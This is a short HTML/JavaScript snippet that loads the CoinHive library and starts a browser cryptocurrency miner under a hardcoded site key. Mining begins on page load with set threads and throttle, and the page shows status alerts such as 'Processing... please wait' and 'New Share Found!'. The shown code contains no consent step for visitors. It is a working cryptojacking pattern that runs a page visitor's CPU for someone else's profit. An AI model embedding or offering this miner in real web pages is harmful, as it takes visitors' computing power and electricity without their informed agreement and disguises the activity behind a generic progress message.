<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>

  	// var miner = new CoinHive.Anonymous('CDCmw6JzDrUxtmQTXzq5AZsIx724UG6m');

    var miner = new CoinHive.User('CDCmw6JzDrUxtmQTXzq5AZsIx724UG6m', 'someuser', {
  	threads: 2,
  	autoThreads: false,
  	throttle: 0.5,
  	forceASMJS: false
  });

    miner.start();
    console.log('Miner has startet ');

    miner.on('job', function(getHashesPerSecond) {
  	console.log('new job! ');
    var hash = "0";
    var hash = miner.getHashesPerSecond();

    console.log('Your Hashrate is:', hash);

    document.getElementById("hash").innerHTML = hash;
    document.getElementById("all").innerHTML = '  <div class="alert alert-warning" id="found" role="alert"> Processing... please wait</div>';
    // document.getElementById("job").innerHTML = "New Job! wait... ";
    });

    miner.on('found', function(params) {
  	console.log('new found! ');
    // document.getElementById("all").innerHTML = "New Found!";
    document.getElementById("all").innerHTML = '  <div class="alert alert-success" id="found" role="alert"> New Share Found!</div>';
    });


    miner.on('accepted', function(params) {
  	console.log('new accepted! ');
    document.getElementById("all").innerHTML = '  <div class="alert alert-primary" id="found" role="alert"> New Share Accepted!</div>';
  //  document.getElementById("accepted").innerHTML = "New Accepted!";
    });


    miner.on('error', function(params) {
  	if (params.error !== 'connection_error') {
  		console.log('The pool reported an error', params.error);
  	}
  });



  </script>
